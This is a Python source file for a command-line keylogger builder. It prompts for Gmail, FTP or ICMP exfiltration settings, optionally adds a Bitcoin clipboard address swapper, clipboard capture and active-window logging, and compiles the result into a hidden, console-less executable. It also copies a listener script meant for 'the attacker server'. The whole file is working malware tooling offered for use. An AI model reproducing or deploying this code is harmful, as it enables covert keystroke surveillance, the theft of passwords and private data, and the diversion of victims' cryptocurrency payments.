"""
Thanks to:
-Unknow101 (ICMP exfiltration idea)
-0x66 (btc changer idea)
-BreakingMaths (current window idea)
"""
from sys import platform, exit
import os
from shutil import rmtree, copy2

def main():
    first_while = True
    if platform == "win32":
        os.system("cls")
    elif platform == "linux":
        os.system("clear")
    try:
        os.mkdir('output')
    except:
        pass
    names_files = {'1': 'simple_template.py', '2': "smtp_template.py", '3': 'ftp_template.py', '4': 'icmp_template.py'}
    print('$$$$$$$\                                          $$\                                                        ')
    print('$$  __$$\                                         $$ |                                                       ')
    print('$$ |  $$ |$$\   $$\  $$$$$$$\  $$$$$$$\  $$$$$$\  $$ |      $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  ')
    print('$$$$$$$  |$$ |  $$ |$$  _____|$$  _____|$$  __$$\ $$ |     $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ ')
    print('$$  __$$< $$ |  $$ |\$$$$$$\  \$$$$$$\  $$$$$$$$ |$$ |     $$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|')
    print('$$ |  $$ |$$ |  $$ | \____$$\  \____$$\ $$   ____|$$ |     $$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      ')
    print('$$ |  $$ |\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ $$$$$$$$\\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      ')
    print('\__|  \__| \______/ \_______/ \_______/  \_______|\________|\______/  \____$$ | \____$$ | \_______|\__|      ')
    print('                                                                     $$\   $$ |$$\   $$ |                    ')
    print('                                                                     \$$$$$$  |\$$$$$$  |                    ')
    print('                                                                      \______/  \______/                     ')
    print("[1] Simple KeyLogger")
    print("[2] SMTP (mail) KeyLogger")
    print("[3] FTP KeyLogger (Debian only if TLS VERSION=1.2)")
    print("[4] ICMP KeyLogger (more discreet)")
    print("[5] Clear output folder")
    while first_while:
        choose_file = input("[*]>> ")
        if choose_file == "5":
            items = os.listdir("output")
            for i in items:
                os.remove("output/"+i)
            main()
        try:
            filename = names_files[choose_file]
        except KeyError:
            print("[-] You need to choose a number between 1 and 5")
            continue
        while first_while:
            if filename == "smtp_template.py":
                print("[?] Write the gmail address from which you will send the mails")
                while first_while:
                    mail = input("[*]>> ")
                    if mail == "" or " " in mail:
                        print("[-] The mail can not be empty or contains spaces")
                        continue
                    print("[?] Write the password for gmail")
                    while first_while:
                        password = input("[*]>> ")
                        if password == "":
                            print("[-] The password can not be empty")
                            continue
                        print("[?] Write the email address where the mails will be sent")
                        while first_while:
                            email_send = input("[*]>> ")
                            if email_send == "" or " " in email_send:
                                print("[-] The mail can not be empty or contains spaces")
                                continue
                            print("[?] Write the label of this keylogger")
                            while first_while:
                                label = input("[*]>> ")
                                if label == "":
                                    print("[-] The label can not be empty")
                                    continue
                                print("[?] What will be the delay between each mail")
                                print("[1] 10 min")
                                print("[2] 15 min")
                                print("[3] 30 min")
                                print("[4] 45 min")
                                print("[5] 1 H")
                                print("[6] 2 H")
                                print("[7] 3 H")
                                while first_while:
                                    delay = input("[*]>> ")
                                    if delay == "1":
                                        delay = "600"
                                        first_while = False
                                    elif delay == "2":
                                        delay = "900"
                                        first_while = False
                                    elif delay == "3":
                                        delay = "1800"
                                        first_while = False
                                    elif delay == "4":
                                        delay = "2700"
                                        first_while = False
                                    elif delay == "5":
                                        delay = "3600"
                                        first_while = False
                                    elif delay == "6":
                                        delay = "7200"
                                        first_while = False
                                    elif delay == "7":
                                        delay = "10800"
                                        first_while = False
                                    else:
                                        print("[-] You need to choose a number between 1 and 7")
                                        continue
            elif filename == "ftp_template.py":
                print("[?] Write the server address")
                while first_while:
                    server = input("[*]>> ")
                    if server == "":
                        print("[-] The server address can not be empty")
                        continue
                    print("[?] Write the server port (21 by default)")
                    while first_while:
                        port = input("[*]>> ")
                        if port == "":
                            port = "21"
                        print("[?] Use TLS y/n (y by default)")
                        while first_while:
                            tls = input("[*]>> ")
                            if tls == "" or tls == "y":
                                tls = "True"
                            elif tls == "n":
                                tls = "False"
                            else:
                                print("[-] you need to choose y/n")
                                continue
                            print("[?] Write the FTP username")
                            while first_while:
                                username = input("[*]>>")
                                if username == "":
                                    print("[-] The username can not by empty")
                                    continue
                                print("[?] Write the FTP password")
                                while first_while:
                                    password = input("[*]>>")
                                    if password == "":
                                        print("[-] The password can not by empty")
                                        continue
                                    print("[?] Write the label of this keylogger")
                                    while first_while:
                                        label = input("[*]>> ")
                                        if label == "":
                                            print("[-] The label can not be empty")
                                            continue
                                        print("[?] What will be the delay between each upload")
                                        print("[1] 10 min")
                                        print("[2] 15 min")
                                        print("[3] 30 min")
                                        print("[4] 45 min")
                                        print("[5] 1 H")
                                        print("[6] 2 H")
                                        print("[7] 3 H")
                                        while first_while:
                                            delay = input("[*]>> ")
                                            if delay == "1":
                                                delay = "600"
                                                first_while = False
                                            elif delay == "2":
                                                delay = "900"
                                                first_while = False
                                            elif delay == "3":
                                                delay = "1800"
                                                first_while = False
                                            elif delay == "4":
                                                delay = "2700"
                                                first_while = False
                                            elif delay == "5":
                                                delay = "3600"
                                                first_while = False
                                            elif delay == "6":
                                                delay = "7200"
                                                first_while = False
                                            elif delay == "7":
                                                delay = "10800"
                                                first_while = False
                                            else:
                                                print("[-] You need to choose a number between 1 and 7")
                                                continue
            elif filename == "icmp_template.py":
                print("[?] Write the server address")
                while 1:
                    server = input("[*]>> ")
                    if server == "":
                        print("[-] The server address can not be empty")
                        continue
                    else:
                        break
            print("[?] Do you want to add a BTC address changer option y/n")
            while 1:
                btc_changer = input("[*]>> ")
                if btc_changer == "y":
                    btc_changer = True
                    print("[?] What is your BTC address")
                    while 1:
                        btc_address = input("[*]>> ")
                        if btc_address == "" or " " in btc_address:
                            print("[-] The BTC address can not be empty or contains spaces")
                            continue
                        else:
                            break
                elif btc_changer == "n":
                    btc_changer = False
                else:
                    print("[-] You need to choose y/n")
                    continue
                print("[?] Do you want to capture the clipboard y/n")
                while 1:
                    clipboard = input("[*]>> ")
                    if clipboard == "y":
                        clipboard = True
                    elif clipboard == "n":
                        clipboard = False
                    else:
                        print("[-] You need to choose y/n")
                        continue
                    print("[?] Do you want to write to the log the active window y/n")
                    while 1:
                        window = input("[*]>> ")
                        if window == "y":
                            window = True
                        elif window == "n":
                            window = False
                        else:
                            print("[-] You need to choose y/n")
                            continue
                        print("[?] What will be the name of the file")
                        while 1:
                            output_name = input("[*]>> ")
                            if output_name == "":
                                print("[-] The name of the file can not be empty")
                                continue
                            if not output_name.endswith(".py"):
                                output_name_py = output_name+".py"
                                output_name_exe = output_name+".exe"
                            elif output_name.endswith(".py"):
                                output_name_py = output_name
                                output_name = output_name[:-3]
                                output_name_exe = output_name+".exe"
                            try:
                                os.remove("output/"+output_name_py)
                            except:
                                pass
                            try:
                                os.remove("output/"+output_name_exe)
                            except:
                                pass
                            copy2("templates/"+filename, "output/"+output_name_py)
                            f = open("output/"+output_name_py, "r+", encoding="UTF-8")
                            content = f.read()
                            f.seek(0)
                            f.truncate()
                            if filename == "smtp_template.py":
                                content = content.replace('$EMAIL', mail)
                                content = content.replace('$PASSWORD', password)
                                content = content.replace('$SEND', email_send)
                                content = content.replace('$LABEL', label)
                                content = content.replace('$WAITING', delay)
                            elif filename == "ftp_template.py":
                                content = content.replace('$SERVER', server)
                                content = content.replace('$PORT', port)
                                content = content.replace('$TLS', tls)
                                content = content.replace('$USERNAME', username)
                                content = content.replace('$PASSWORD', password)
                                content = content.replace('$LABEL', label)
                                content = content.replace('$DELAY', delay)
                            elif filename == "icmp_template.py":
                                content = content.replace('$SERVER', server)
                            f.write(content)
                            f.close()
                            f = open("output/"+output_name_py, "a", encoding="UTF-8")
                            if btc_changer:
                                btc_file = open("modules/btc_changer.py", "r", encoding="UTF-8")
                                f.write(btc_file.read().replace("$BTC_ADDRESS", btc_address))
                                btc_file.close()
                            if clipboard:
                                clipboard_file = open("modules/get_clipboard.py", "r", encoding="UTF-8")
                                f.write(clipboard_file.read())
                                clipboard_file.close()
                            if window:
                                if platform in ['linux', 'linux2']:
                                    window_file = open("modules/get_active_window_linux.py", "r", encoding="UTF-8")
                                elif platform in ['Windows', 'win32', 'cygwin']:
                                    window_file = open("modules/get_active_window_windows.py", "r", encoding="UTF-8")
                                f.write(window_file.read())
                                window_file.close()
                            f.close()
                            print("[?] Do you want to compile the keylogger y/n")
                            while 1:
                                compile = input("[*]>> ")
                                if compile == "y":
                                    print("[*] Compiling...")
                                    if platform in ['linux', 'linux2']:
                                        os.system("pyinstaller --onefile --noconsole --distpath output output/"+output_name_py+">/dev/null 2>&1")
                                    elif platform in ['Windows', 'win32', 'cygwin']:
                                        os.system("pyinstaller --onefile --noconsole --distpath output output/"+output_name_py+" > nul 2>&1")
                                    rmtree('build')
                                    os.remove(output_name+".spec")
                                    rmtree("output/__pycache__")
                                    print("[+] Done ! output\\"+output_name_exe)
                                    if filename == "icmp_template.py":
                                        copy2("templates/icmp_listener.py", "output/"+output_name+"_listener.py")
                                        print("[*] Lauch output/"+output_name+"_listener.py on the attacker server (need scapy)")
                                elif compile == "n":
                                    print("[+] Bye ! output\\"+output_name_py)
                                    if filename == "icmp_template.py":
                                        copy2("templates/icmp_listener.py", "output/"+output_name+"_listener.py")
                                        print("[*] Lauch output/"+output_name+"_listener.py on the attacker server (need scapy)")

                                exit(0)














try:
    main()
except KeyboardInterrupt:
    print("\n[+] Bye !")
